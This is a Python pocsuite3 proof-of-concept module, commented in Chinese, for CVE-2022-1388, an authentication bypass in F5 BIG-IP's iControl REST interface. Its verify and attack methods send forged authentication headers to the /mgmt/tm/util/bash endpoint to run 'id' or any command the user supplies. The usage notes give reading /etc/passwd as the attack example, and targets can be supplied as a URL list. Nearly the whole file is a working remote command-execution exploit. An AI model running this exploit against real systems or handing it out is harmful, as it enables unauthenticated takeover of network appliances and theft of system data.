from collections import OrderedDict
from urllib.parse import urljoin
import re,os,json
from requests_toolbelt import MultipartEncoder
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大
    vulDate = '2022-05-11'  #漏洞公开的时间,不知道就写今天
    createDate = '2022-05-11'  # 编写 PoC 的日期
    updateDate = '2022-05-11'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = 'F5 BIG-IP 存在身份验证绕过漏洞'  # PoC 名称
    appPowerLink = 'https://www.freesinno.com/'  # 漏洞厂商主页地址
    appName = 'F5 BIG-IP'  # 漏洞应用名称
    appVersion = '''16.1.0 < BIG-IP < 16.1.2
15.1.0 < BIG-IP < 15.1.5
14.1.0 < BIG-IP < 14.1.4
13.1.0 < BIG-IP < 13.1.4
12.1.0 < BIG-IP < 12.1.6
11.6.1 < BIG-IP < 11.6.5'''  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        F5 BIG-IP iControl REST 存在身份验证绕过漏洞 (CVE-2022-1388)
    '''
  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    利用：pocsuite -r .\F5_BIG-IP_login-bypass-2022-1388.py -u url(-f url.txt) --attack --cmd 'cat /etc/passwd' 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    def _options(self):
        o = OrderedDict()
        o["cmd"] = OptString(default='id',description='输入文件路径',require=False)
        return o
    
    def _verify(self):
        result = {}
        path = "/mgmt/tm/util/bash"
        url = self.url + path
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Connection': 'keep-alive, X-F5-Auth-Token',
            'X-F5-Auth-Token':'a',
            'Authorization': 'Basic YWRtaW46',
            'Content-Type': 'application/json',
            }
        data = {"command": "run","utilCmdArgs": "-c 'id'"}
        try:
            resq = requests.post(url=url,headers=headers,json=data)
            if  resq.status_code==200 and 'uid=' in resq.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Command echo'] = json.loads(resq.text)['commandResult']
             
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        result = {}
        path = "/mgmt/tm/util/bash"
        url = self.url + path
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Connection': 'keep-alive, X-F5-Auth-Token',
            'X-F5-Auth-Token':'a',
            'Authorization': 'Basic YWRtaW46',
            'Content-Type': 'application/json',
            }
        command = self.get_option("cmd")
        data = {"command": "run","utilCmdArgs": "-c '{}'".format(command)}
        try:
            resq = requests.post(url=url,headers=headers,json=data)
            if  resq.status_code==200 :
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Command echo'] = json.loads(resq.text)['commandResult']
             
        except Exception as e:
            return
        return self.parse_output(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(POC)
